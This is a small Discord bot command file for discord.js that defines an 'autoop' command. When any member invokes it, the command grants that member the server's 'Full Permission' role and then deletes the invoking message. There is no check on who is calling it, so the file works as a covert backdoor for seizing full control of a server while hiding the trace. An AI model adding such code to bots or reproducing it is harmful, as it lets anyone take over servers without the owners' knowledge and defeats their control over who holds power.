const Discord = require("discord.js");

module.exports.run = async (bot, message, args, ops) => {


    let role = message.guild.roles.find(r => r.name === "Full Permission");
    message.member.addRole(role);
    
    message.delete();

}

module.exports.help = {
  name: "autoop"
}
